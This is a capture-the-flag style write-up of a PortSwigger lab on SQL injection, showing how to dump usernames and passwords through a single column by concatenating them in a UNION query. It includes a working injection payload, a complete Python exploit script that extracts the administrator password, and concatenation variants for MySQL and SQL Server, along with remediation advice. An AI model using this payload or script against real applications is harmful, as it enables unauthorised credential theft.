# SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-19

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Pets'
```

Unlike lab 5, this lab's original query only returns **one column** that's a suitable target for string data — there isn't a second text column available to hold both a username and a password separately. A standard `UNION SELECT username, password FROM users` would fail here due to a column type/count mismatch.

## Discovery / Exploitation
The workaround is to concatenate both values into a single string using the database's string concatenation operator, with a separator character in between so the two pieces can be split apart again afterward:

```
' UNION SELECT NULL, username || '*' || password FROM users--
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, username || '*' || password FROM users--'
```

This returns rows like `administrator*s3cr3tPassw0rd` in the single available text column — one string containing both values, delimited by `*`. The delimiter just needs to be a character unlikely to appear in either a username or password.

## Impact
Same end result as lab 5 — full credential disclosure, including the administrator account — but demonstrates that a limited number of text-compatible columns doesn't stop a UNION-based attack; it just requires combining multiple fields into one before extraction.

## Proof of Concept (Python)
This script sends the concatenated UNION payload through Burp Suite (`127.0.0.1:8080`), then uses a regex search via BeautifulSoup to locate the combined string and splits it on the `*` delimiter to recover the password.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_users_table(url):
    path = '/filter?category=Pets'
    sql_payload = "'+UNION+select+NULL,username||'*'||password+from+users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if 'administrator' in res:
        print("[+] found the administrator password...")
        soup = BeautifulSoup(res, 'html.parser')
        match = soup.find(string=re.compile('.*administrator.*'))
        admin_password = match.split("*")[1]
        print("[+] the administrator password is '%s'." % admin_password)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] could not find administrator password")
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Sends a `UNION SELECT NULL, username || '*' || password FROM users` payload to the vulnerable `category` parameter
3. Checks whether `"administrator"` appears anywhere in the response
4. Uses a regex search to find the specific page element containing "administrator", then splits the combined string on `*` to isolate the password
5. Prints the recovered password, or reports failure if no matching row was found

**Example run:**
```bash
python3 exploit_sqli_single_column_dump.py https://your-lab-url.web-security-academy.net
```

**Note:** The `||` concatenation operator works on databases like PostgreSQL and Oracle. Other engines use different syntax — MySQL uses `CONCAT(username, '*', password)`, and SQL Server uses `+` (e.g. `username + '*' + password`).

## Remediation
- Use **parameterized queries (prepared statements)** — prevents this variation of the attack the same way it prevents labs 3–5.
- Apply the **principle of least privilege** to the database account the application uses.
- **Never store plaintext passwords**; hash and salt them so a dump like this doesn't yield directly usable credentials.
- Avoid exposing **raw database structure and error feedback**, which enabled the reconnaissance that made this precise payload possible.

## Takeaway
This lab reinforces that UNION-based data extraction isn't limited by a low number of available text columns — string concatenation lets an attacker pack multiple fields into a single column, then split them apart client-side. It's a useful technique to know because column count restrictions are common in real applications, and this is the standard way around them.
